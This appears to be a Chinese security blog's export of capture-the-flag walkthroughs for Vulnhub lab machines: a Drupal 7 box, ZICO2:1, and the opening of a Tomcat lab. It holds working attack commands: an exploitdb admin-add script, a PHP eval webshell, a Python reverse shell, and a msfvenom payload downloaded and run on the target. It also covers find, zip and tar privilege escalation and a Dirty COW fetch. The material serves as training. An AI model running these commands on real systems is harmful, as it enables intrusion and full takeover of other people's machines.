<p>&emsp;&emsp;在exploitdb中有一个针对Drupal 7版本的攻击脚本，可以增加一个admin权限的用户账号，第二种方法是通过该过程新增admin密码。</p>
<ol>
<li>查看Drupal版本，确定Drupal版本为7.24</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /var/www/includes/bootstrap.inc | grep VERSION</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210225806246.png" alt="image-20211210225806246"></p>
<ol start="2">
<li>使用searchsploit查找可利用漏洞。选择添加管理员功能的攻击脚本适用于7.0-7.31范围（每个脚本括号后面有功能描述），符合7.24版本。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit drupal</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210225927090.png" alt="image-20211210225927090"></p>
<ol start="3">
<li>利用drupal7.0版本漏洞增加有admin权限的用户</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.43.62 -u w01ke -p w01ke</span><br><span class="line">后面靶机出了点问题，靶机ip换成了192.168.43.62</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;新增的管理员用户如下</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210230538034.png" alt="image-20211210230538034"></p>
<p>&emsp;&emsp;使用新添加的用户w01ke登录网站，在content模块下找到flag3。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210230701756.png" alt="image-20211210230701756"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210230747456.png" alt="image-20211210230747456"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Congratulations！</span><br><span class="line">Special PERMS will help FIND the passwd - but you&#x27;ll need to -exec that command to work out how to get what&#x27;s in the shadow.</span><br><span class="line"></span><br><span class="line">恭喜你!</span><br><span class="line">特殊的PERMS可以帮助找到密码-但您需要-exec该命令，以确定如何获取在shadow文件中的内容</span><br><span class="line"></span><br><span class="line">很明显的提示：find+perms+exec 命令用来提权</span><br></pre></td></tr></table></figure>

<h1 id="五、提权"><a href="#五、提权" class="headerlink" title="五、提权"></a>五、提权</h1><p>&emsp;&emsp;根据flag3的提示提权，我们尝试查看用户列表信息（包含用户权限信息），这些用户信息一般存储在/etc/passwd目录下。</p>
<p>&emsp;&emsp;查看用户列表，获取信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210230913401.png" alt="image-20211210230913401"></p>
<p>&emsp;&emsp;发现了flag4这个用户，并且得到了flag4的主目录为home目录。我们切换到home目录寻找flag4相关文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/flag4</span><br><span class="line">cat flag4.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210231011382.png" alt="image-20211210231011382"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag4提示内容:</span><br><span class="line">提示最后flag <span class="keyword">in</span> root下面。</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;其实也可以直接用find命令查找flag4这个关键字，也能爆出flag4文件的路径。主要看个人思路</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638890458865-543de0aa-dfe5-4431-b232-17b986961b35.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name <span class="string">&quot;flag4</span></span><br><span class="line"><span class="string">cd /home/flag4</span></span><br><span class="line"><span class="string">cat flag4.txt</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;根据flag4的提示信息，最后一个flag存在于root目录下。我们可以使用find命令查找root目录下相关文件信息。</p>
<ol>
<li>使用find命令查看与/root目录有关的文件信息</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find /root</span><br><span class="line"></span><br><span class="line">find命令是用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则find命令将在当前目录下查找子目录与文件，并将查找到的子目录和文件全部进行显示。</span><br><span class="line"></span><br><span class="line">find(选项)(参数)</span><br><span class="line">-exec&lt;执行指令&gt;：假设find指令的回传值为True，就执行该指令</span><br><span class="line">-perm&lt;权限数值&gt;：查找符合指定的权限数值的文件或目录</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210231236305.png" alt="image-20211210231236305"></p>
<p>&emsp;&emsp;发现flag文件存在于/root目录下，尝试打开它，发现没有权限，所以必须要提权才能查看最终的flag文件</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210231322471.png" alt="image-20211210231322471"></p>
<ol start="2">
<li>根据flag3中的提示，使用”-exec“提权,也就是find+perms+exec 命令来提权。这里有两种方法可以用，看个人想法。详细关于find提权会在另一篇文章中详解</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. find ./ acce -<span class="built_in">exec</span> <span class="string">&#x27;/bin/sh&#x27;</span> \;</span><br><span class="line"></span><br><span class="line">2. touch bcce</span><br><span class="line">find bcce -<span class="built_in">exec</span> <span class="string">&#x27;/bin/sh&#x27;</span> \;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;成功访问最后一个flag文件，游戏结束了。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211210231532987.png" alt="image-20211210231532987"></p>
<h1 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h1><p>&emsp;&emsp;本次初级内网渗透靶场虽然初级，但也涉及了大量的知识点。</p>
<ol>
<li>使用python反弹一个交互式shell</li>
<li>配置文件十分重要，重要的配置文件可以搜索相关系统或者框架的默认路径，能在较短时间内获取有用信息。如： drupal的/sites/default/settings.php ，是数据库连接配置文件</li>
<li>exploit-db（漏洞利用库）真的很强大，里面很多攻击脚本。不知道为什么以前很少用，现在要加强对他的了解了。他就是metspoit的兄弟</li>
<li>/etc/passwd：linux默认存储用户列表的文件</li>
<li>linux suid提权相关知识，在后面的文章中再详细了解。</li>
</ol>
<p>参考链接：<a href="https://www.cnblogs.com/kbhome/p/13296397.html">https://www.cnblogs.com/kbhome/p/13296397.html</a></p>
]]></content>
      <categories>
        <category>综合靶场</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>提权</tag>
        <tag>Drupal</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub——ZICO2:1</title>
    <url>/post/da4faa60.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、靶机说明"><a href="#一、靶机说明" class="headerlink" title="一、靶机说明"></a>一、靶机说明</h1><h2 id="1、下载链接"><a href="#1、下载链接" class="headerlink" title="1、下载链接"></a>1、下载链接</h2><p>&emsp;&emsp;靶场镜像：链接: <a href="https://www.vulnhub.com/entry/zico2-1,210/">https://www.vulnhub.com/entry/zico2-1,210/</a></p>
<h2 id="2、靶机准备"><a href="#2、靶机准备" class="headerlink" title="2、靶机准备"></a>2、靶机准备</h2><h3 id="（1）重置靶场密码"><a href="#（1）重置靶场密码" class="headerlink" title="（1）重置靶场密码"></a>（1）重置靶场密码</h3><p>&emsp;&emsp;重启主机，疯狂按shift，进入如下界面后，按e</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209000543450.png" alt="image-20211209000543450"></p>
<p>&emsp;&emsp;找到linux开头的行，在最后输入 <code>init=/bin/bash</code>，输入完成后按<strong>Crtl+X</strong></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209000709270.png" alt="image-20211209000709270"></p>
<p>&emsp;&emsp;<code>mount -o rw,remount /</code>，回车</p>
<p>&emsp;&emsp;<code>    passwd root</code>，输入新密码两次</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209000757183.png" alt="image-20211209000757183"></p>
<p>&emsp;&emsp;如果提示改变密码成功，重启该虚拟机</p>
<h3 id="（2）查看IP"><a href="#（2）查看IP" class="headerlink" title="（2）查看IP"></a>（2）查看IP</h3><p>&emsp;&emsp;使用刚才修改的密码进入靶场主机，输入<code>ip a</code>，查看IP地址</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209001103683.png" alt="image-20211209001103683"></p>
<h1 id="三、信息收集"><a href="#三、信息收集" class="headerlink" title="三、信息收集"></a>三、信息收集</h1><h2 id="1、探测主机IP"><a href="#1、探测主机IP" class="headerlink" title="1、探测主机IP"></a>1、探测主机IP</h2><p>&emsp;&emsp;使用arp-scan探索靶机IP，发现IP地址为192.168.1.107</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209001214999.png" alt="image-20211209001214999"></p>
<h2 id="2、开放端口与服务扫描"><a href="#2、开放端口与服务扫描" class="headerlink" title="2、开放端口与服务扫描"></a>2、开放端口与服务扫描</h2><p>&emsp;&emsp;使用nmap对IP进行扫描：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.107</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;可以看到开启了SSH，HTTP等服务</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209001421801.png" alt="image-20211209001421801"></p>
<blockquote>
<p>111端口RPCBIND用于取代旧版本中的portmap组件。<br>简单说，RPCBIND就是为了将不同服务与对应的端口进行绑定，以便支持机器间的相互操作</p>
</blockquote>
<p>&emsp;&emsp;访问80端口的服务，是一个网站</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209001534937.png" alt="image-20211209001534937"></p>
<h2 id="3、目录扫描"><a href="#3、目录扫描" class="headerlink" title="3、目录扫描"></a>3、目录扫描</h2><p>&emsp;&emsp;使用dirsearch扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.43.8</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;扫出了个<code>/dbadmin</code>目录很可疑</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209001808868.png" alt="image-20211209001808868"></p>
<p>&emsp;&emsp;访问该目录，发现有个PHP文件，点击访问，发现是个后台登录页面，并且提示了框架信息，phpLiteAdmin 1.9.3版本存在一个远程php代码执行漏洞</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209002030658.png" alt="image-20211209002030658"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209002042837.png" alt="image-20211209002042837"></p>
<h1 id="四、漏洞探测与利用"><a href="#四、漏洞探测与利用" class="headerlink" title="四、漏洞探测与利用"></a>四、漏洞探测与利用</h1><h2 id="1、Owasp-zap扫描"><a href="#1、Owasp-zap扫描" class="headerlink" title="1、Owasp-zap扫描"></a>1、Owasp-zap扫描</h2><p>&emsp;&emsp;使用owasp-zap对网站进行扫描，owasp-zap是一个对网站进行自动漏洞扫描的工具</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209002516533.png" alt="image-20211209002516533"></p>
<p>&emsp;&emsp;扫描结束，Alerts一栏为有漏洞的地方，旗子衍颜色越胜代表漏洞越严重，这里发现其中有一个目录遍历的漏洞，<code>http://192.168.43.8/view.php?page=../../../../../../etc/passwd</code>，进入该页面发现的确爆出了用户名的相关信息</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209002654692.png" alt="image-20211209002654692"></p>
<p>&emsp;&emsp;这里其实也可以在主页，点击CHENC THEM OUT!按钮，会发现URL变成了<a href="http://192.168.43.8/view.php?page=tools.html%EF%BC%8C%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%8C%E8%BF%99%E6%A0%B7%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0%E7%9A%84%E7%A1%AE%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">http://192.168.43.8/view.php?page=tools.html，可能存在文件包含，这样也可以发现的确存在文件包含</a></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209003048221.png" alt="image-20211209003048221"></p>
<p>&emsp;&emsp;只要看到文件包含这种URL路径，就要想到可以利用的点大概有以下几点</p>
<blockquote>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">、</span>	<span class="string">任意url跳转</span></span><br><span class="line"><span class="number">2</span><span class="string">、</span>	<span class="string">Ssrf</span></span><br><span class="line"><span class="number">3</span><span class="string">、</span>	<span class="string">文件包含</span></span><br><span class="line"><span class="number">4</span><span class="string">、</span>	<span class="string">Sql注入</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="2、爆破密码"><a href="#2、爆破密码" class="headerlink" title="2、爆破密码"></a>2、爆破密码</h2><p>&emsp;&emsp;后台登录只验证了密码，可以尝试使用字典对其进行爆破，或者使用弱口令，这里密码是admin，直接进入后台</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209002837222.png" alt="image-20211209002837222"></p>
<h2 id="3、信息搜集"><a href="#3、信息搜集" class="headerlink" title="3、信息搜集"></a>3、信息搜集</h2><p>&emsp;&emsp;在users表可以看到有两个用户信息</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209003527407.png" alt="image-20211209003527407"></p>
<p>&emsp;&emsp;丢到md5解密看看</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209003711369.png" alt="image-20211209003711369"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209003813350.png" alt="image-20211209003813350"></p>
<p>&emsp;&emsp;得到两个账号密码</p>
<ul>
<li>用户名：root   密码：34kroot34</li>
<li>用户名：zico    密码：zico2215@</li>
</ul>
<p>&emsp;&emsp;使用<code>searchsploit phpliteadmin</code>命令，搜索是否有能够利用的EXP，发现确实存在对应版本的利用脚本</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209155456133.png" alt="image-20211209155456133"></p>
<p>&emsp;&emsp;查看说明，意思就是可以利用phpLiteAdmin，创建一个数据库，这个数据库名称起名为xx.php，如果后端没有这个数据库，比如hack.php，会自动创建一个数据库名称的文件，然后在里面填充数据，比如<code>&lt;?php phpinfo()?&gt;</code>，然后访问，会发现执行成功</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209155714073.png" alt="image-20211209155714073"></p>
<p>&emsp;&emsp;这里我有两个想法</p>
<ol>
<li>用SSH登录账号密码，看能否成功</li>
<li>利用phpLiteAdmin 1.9.3版本存在一个远程php代码执行漏洞</li>
</ol>
<h2 id="想法一：用SSH登录"><a href="#想法一：用SSH登录" class="headerlink" title="想法一：用SSH登录"></a>想法一：用SSH登录</h2><p>&emsp;&emsp;发现事情并不简单，登录失败。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209004421258.png" alt="image-20211209004421258"></p>
<h2 id="想法二：利用远程php代码执行漏洞"><a href="#想法二：利用远程php代码执行漏洞" class="headerlink" title="想法二：利用远程php代码执行漏洞"></a>想法二：利用远程php代码执行漏洞</h2><p>&emsp;&emsp;步骤一：返回到数据库管理页面先创造一个.php文件作为数据库</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209004844688.png" alt="image-20211209004844688"></p>
<p>&emsp;&emsp;步骤二：在该数据库（php文件下）创建一个数据表a（随便设置名字）</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209004954886.png" alt="image-20211209004954886"></p>
<p>&emsp;&emsp;步骤三：在Default Value下插入一句话木马（因为在这里上传的一句话中引号会被过滤，所以一句话不含单引号；）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[ok]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209010553084.png" alt="image-20211209010553084"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209010559508.png" alt="image-20211209010559508"></p>
<p>&emsp;&emsp;使用文件包含一句话木马</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209010758912.png" alt="image-20211209010758912"></p>
<p>&emsp;&emsp;步骤五：上菜刀，只是www-data还不是最高的root权限</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209011349557.png" alt="image-20211209011349557"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209011609403.png" alt="image-20211209011609403"></p>
<h1 id="五、反弹shell"><a href="#五、反弹shell" class="headerlink" title="五、反弹shell"></a>五、反弹shell</h1><h2 id="方法一：python反弹shell"><a href="#方法一：python反弹shell" class="headerlink" title="方法一：python反弹shell"></a>方法一：python反弹shell</h2><p>&emsp;&emsp;在kali端监听并且开放端口4444，在页面url使用以下pyhon反shell的payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.43</span><span class="number">.8</span>/view.php?page=../../../../../usr/databases/w01ke.php&amp;ok=</span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.43.167&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="方法二：利用php反shell"><a href="#方法二：利用php反shell" class="headerlink" title="方法二：利用php反shell"></a>方法二：利用php反shell</h2><p>&emsp;&emsp;思路：用kali下msfvenom生成一个后门文件，然后利用之前的一句话木马，命令执行，让靶机将后门文件主动下载到本机，然后弹回shell</p>
<p>&emsp;&emsp;首先创建后门文件，名字为shell命令为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.43.167 LPORT=5555 -f elf  -o shell</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209160542854.png" alt="image-20211209160542854"></p>
<p>&emsp;&emsp;执行命令 <code>cp shell /var/www/html</code>，将后门文件复制到apache的网站根目录</p>
<p>&emsp;&emsp;执行命令 <code>chmod 777 /var/www/html/shell</code>，赋予后门文件可读可写可执行权限</p>
<p>&emsp;&emsp;执行命令 <code>service apache2 start</code>，启动攻击机的apache服务</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209161335056.png" alt="image-20211209161335056"></p>
<p>&emsp;&emsp;msfconsole监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.167</span><br><span class="line">set LPORT 5555</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209161856847.png" alt="image-20211209161856847"></p>
<p>&emsp;&emsp;利用之前上传的一句话，让靶机主动下载该文件，反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ok=system(&quot;cd /tmp;wget http://192.168.43.167/shell;chmod 777 shell;./shell&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209162806633.png" alt="image-20211209162806633"></p>
<p>&emsp;&emsp;进入shell，调用交互式命令行，同时美化命令行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<h1 id="六、提权"><a href="#六、提权" class="headerlink" title="六、提权"></a>六、提权</h1><p>&emsp;&emsp;进入到/home目录，查看文件，发现所要进行的下一步操作提示</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209163613674.png" alt="image-20211209163613674"></p>
<p>&emsp;&emsp;进入到wordpress目录下，发现wordpress配置文件，使用cat命令查看到账号密码（如果此时看不到，那么到meterpreter界面，利用download命令，将文件下载到本地进行查看<code>download /home/zico/wordpress/wp-config.php /root</code>）</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209163800306.png" alt="image-20211209163800306"></p>
<p>&emsp;&emsp;尝试用得到的账号密码，通过22端口的ssh登录主机，登录成功</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209164012006.png" alt="image-20211209164012006"></p>
<p>&emsp;&emsp;下一步就是进行提权，获得root权限，来得到最后的flag</p>
<h2 id="1、zip提权"><a href="#1、zip提权" class="headerlink" title="1、zip提权"></a>1、zip提权</h2><p>&emsp;&emsp;执行命令：<code>sudo -l</code>，查看哪些命令具有root权限，发现具有root权限的为两个解压用的命令可执行</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209164131400.png" alt="image-20211209164131400"></p>
<p>&emsp;&emsp;可以利用zip命令来进行提权</p>
<p>&emsp;&emsp;在/tmp目录下创建一个exploit名字的文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">touch /tmp/exploit</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;使用以下命令，提权成功，查看flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u root zip /tmp/exploit.zip /tmp/exploit -T --unzip-command=<span class="string">&quot;sh -c /bin/bash&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209164415754.png" alt="image-20211209164415754"></p>
<h2 id="2、tar提权"><a href="#2、tar提权" class="headerlink" title="2、tar提权"></a>2、tar提权</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /bin/tar cf /dev/null /pwnd --checkpoint=1 --checkpoint-action=exec=/bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209170249295.png" alt="image-20211209170249295"></p>
<h2 id="3、脏牛提权"><a href="#3、脏牛提权" class="headerlink" title="3、脏牛提权"></a>3、脏牛提权</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://192.168.43.167/dirty.c -O /tmp/dirty.c</span><br><span class="line">gcc -pthread dirty.c -o exp -lcrypt    <span class="comment"># 编译</span></span><br><span class="line">./exp w01ke   <span class="comment"># 使用exp，后面的w01ke是密码</span></span><br></pre></td></tr></table></figure>

<h1 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h1><p>&emsp;&emsp;这种自解压的tar和zip提权，需要很多前提条件，真实环境中管理员也不会单独给某个用户zip这样的权限，这种提权方式CTF或许会用到，但是实际环境基本不会有用</p>
]]></content>
      <categories>
        <category>综合靶场</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Web命令执行+SSH</title>
    <url>/post/bb5c1570.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、靶机说明"><a href="#一、靶机说明" class="headerlink" title="一、靶机说明"></a>一、靶机说明</h1><h2 id="1、下载链接"><a href="#1、下载链接" class="headerlink" title="1、下载链接"></a>1、下载链接</h2><p>&emsp;&emsp;靶场镜像：链接: <a href="https://pan.baidu.com/s/19k8jz7VARhFW3LYw8U6T9w">https://pan.baidu.com/s/19k8jz7VARhFW3LYw8U6T9w</a> 提取码: 97qz</p>
<h2 id="2、靶机准备"><a href="#2、靶机准备" class="headerlink" title="2、靶机准备"></a>2、靶机准备</h2><h3 id="（1）重置靶场密码"><a href="#（1）重置靶场密码" class="headerlink" title="（1）重置靶场密码"></a>（1）重置靶场密码</h3><p>&emsp;&emsp;重启主机，长按shift，进入如下界面后，按e</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638887523058-deb5b563-6577-4a58-9b10-b61cf1a64131.png" alt="img"></p>
<p>&emsp;&emsp;找到linux开头的行，在最后输入 <code>init=/bin/bash</code>，输入完成后按<strong>Crtl+X</strong></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638887553506-8fa2221e-2e9e-401e-84d4-facedf386f49.png" alt="img"></p>
<p>&emsp;&emsp;<code>mount -o rw,remount /</code>，回车</p>
<p>&emsp;&emsp;<code>    passwd root</code>，输入新密码两次</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638887624157-f28ec6e4-9aae-42bd-bd62-54c7c5cad409.png" alt="img"></p>
<p>&emsp;&emsp;如果提示改变密码成功，重启该虚拟机</p>
<h3 id="（2）查看IP"><a href="#（2）查看IP" class="headerlink" title="（2）查看IP"></a>（2）查看IP</h3><p>&emsp;&emsp;使用刚才修改的密码进入靶场主机，输入<code>ip a</code>，查看IP地址</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638887754060-4b761873-9c17-4aff-9947-9e1b7da5b83b.png" alt="img"></p>
<h1 id="二、预备知识"><a href="#二、预备知识" class="headerlink" title="二、预备知识"></a>二、预备知识</h1><p>&emsp;&emsp;使用 <code>ssh 用户名@localhost</code> 通过ssh登录服务器是不需要身份验证的</p>
<h1 id="三、信息收集"><a href="#三、信息收集" class="headerlink" title="三、信息收集"></a>三、信息收集</h1><h2 id="1、探测主机IP"><a href="#1、探测主机IP" class="headerlink" title="1、探测主机IP"></a>1、探测主机IP</h2><p>&emsp;&emsp;可以使用以下两种方法：arp-scan和netdiscover</p>
<h3 id="（1）arp-scan"><a href="#（1）arp-scan" class="headerlink" title="（1）arp-scan"></a>（1）arp-scan</h3><p>&emsp;&emsp;使用arp-scan探索靶机IP，发现IP地址为192.168.1.107</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888028567-436c33ce-2113-4b29-82d7-6509f75c0381.png" alt="img"></p>
<h3 id="（2）netdiscover"><a href="#（2）netdiscover" class="headerlink" title="（2）netdiscover"></a>（2）netdiscover</h3><p>&emsp;&emsp;使用以下命令查看Kali本机IP为192.168.1.108</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888053910-d470e9e5-c769-4c94-88e9-d57151d282b5.png" alt="img"></p>
<p>&emsp;&emsp;使用netdiscover命令 <code>netdiscover -r ip/子网掩码</code> 命令来探测靶机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netdiscover -r 192.168.1.1/24</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888190817-8138f7e8-dd3d-4641-9a4c-993c7df0276d.png" alt="img"></p>
<h2 id="2、开放端口与服务扫描"><a href="#2、开放端口与服务扫描" class="headerlink" title="2、开放端口与服务扫描"></a>2、开放端口与服务扫描</h2><p>&emsp;&emsp;使用nmap对IP进行扫描：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.107</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;可以看到开放了8080端口，为HTTP服务</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888418264-d4bb0e6e-05d5-4e4f-b80b-9afeeb715300.png" alt="img"></p>
<p>&emsp;&emsp;访问8080端口，发现是Tomcat建立成功的初始页面</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888484073-cc45897a-36d0-4151-859a-4f3756a7b543.png" alt="img"></p>
<h2 id="3、目录扫描"><a href="#3、目录扫描" class="headerlink" title="3、目录扫描"></a>3、目录扫描</h2><p>&emsp;&emsp;可以使用dirsearch扫描或者nikto探测</p>
<h3 id="（1）dirsearch"><a href="#（1）dirsearch" class="headerlink" title="（1）dirsearch"></a>（1）dirsearch</h3><p>&emsp;&emsp;目录扫描：</p>
